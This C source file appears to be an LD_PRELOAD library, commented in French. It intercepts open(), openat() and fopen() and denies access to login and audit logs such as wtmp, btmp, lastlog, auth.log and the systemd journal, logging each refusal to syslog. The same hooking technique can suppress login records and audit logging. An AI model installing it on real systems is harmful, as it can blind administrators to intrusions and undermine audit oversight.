#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include <stdarg.h>

// Liste des fichiers ou motifs à bloquer
static const char *BLOCKED_PATTERNS[] = {
    "/var/log/wtmp",
    "/var/log/lastlog",
    "/var/log/btmp",
    "/var/log/sysstat",
    "/var/log/journal",
    "Xorg.",
    "/var/log/auth.log",
    NULL // Fin de la liste
};

// Vérifie si le chemin d'accès correspond à un fichier bloqué
static int is_blocked_path(const char *path) {
    if (!path) return 0;
    
    for (int i = 0; BLOCKED_PATTERNS[i] != NULL; i++) {
        if (strstr(path, BLOCKED_PATTERNS[i])) {
            syslog(LOG_WARNING, "[BLOCK] Tentative d'accès refusée à : %s (UID: %d)", path, getuid());
            return 1;
        }
    }
    return 0;
}

// --------------------- Intercepteur pour open() ---------------------
int open(const char *pathname, int flags, ...) {
    static int (*real_open)(const char*, int, mode_t) = NULL;
    if (!real_open) real_open = dlsym(RTLD_NEXT, "open");

    if (is_blocked_path(pathname)) {
        errno = EACCES;
        return -1;
    }

    va_list args;
    va_start(args, flags);
    mode_t mode = (flags & O_CREAT) ? va_arg(args, mode_t) : 0;
    va_end(args);

    return real_open(pathname, flags, mode);
}

// --------------------- Intercepteur pour openat() ---------------------
int openat(int dirfd, const char *pathname, int flags, ...) {
    static int (*real_openat)(int, const char*, int, mode_t) = NULL;
    if (!real_openat) real_openat = dlsym(RTLD_NEXT, "openat");

    if (is_blocked_path(pathname)) {
        errno = EACCES;
        return -1;
    }

    va_list args;
    va_start(args, flags);
    mode_t mode = (flags & O_CREAT) ? va_arg(args, mode_t) : 0;
    va_end(args);

    return real_openat(dirfd, pathname, flags, mode);
}

// --------------------- Intercepteur pour fopen() ---------------------
FILE *fopen(const char *pathname, const char *mode) {
    static FILE* (*real_fopen)(const char*, const char*) = NULL;
    if (!real_fopen) real_fopen = dlsym(RTLD_NEXT, "fopen");

    if (is_blocked_path(pathname)) {
        errno = EACCES;
        return NULL;
    }

    return real_fopen(pathname, mode);
}

